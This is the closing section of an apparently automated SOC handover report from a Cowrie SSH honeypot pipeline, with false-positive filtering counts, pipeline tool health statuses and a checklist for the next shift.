| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 12 |

---

## 🔕 False Positive Summary (51 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 44 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 281 cases |
| Tool 34  | Credential Extractor        | ✅ 143 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 103 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 51 filtered (18.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 64 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 10 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 33 priority case(s) shown individually · 77 recon entry/entries in table (17 group(s) consolidating 137 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-19T10:38:38Z_
